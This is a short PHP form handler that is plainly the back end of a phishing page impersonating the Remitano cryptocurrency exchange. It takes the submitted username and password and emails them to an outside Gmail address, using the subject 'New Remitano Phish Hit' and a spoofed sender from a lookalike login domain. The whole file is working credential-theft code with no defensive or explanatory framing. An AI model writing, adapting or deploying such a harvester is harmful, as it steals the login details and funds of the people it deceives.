<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? 'undefined';
    $password = $_POST['password'] ?? 'undefined';

    $to = "mwananchihuslerloans2@gmail.com";
    $subject = "New Remitano Phish Hit";
    $message = "Username: $username\nPassword: $password";

    $headers = "From: noreply@remitanologin.net";

    mail($to, $subject, $message, $headers);
}
?>
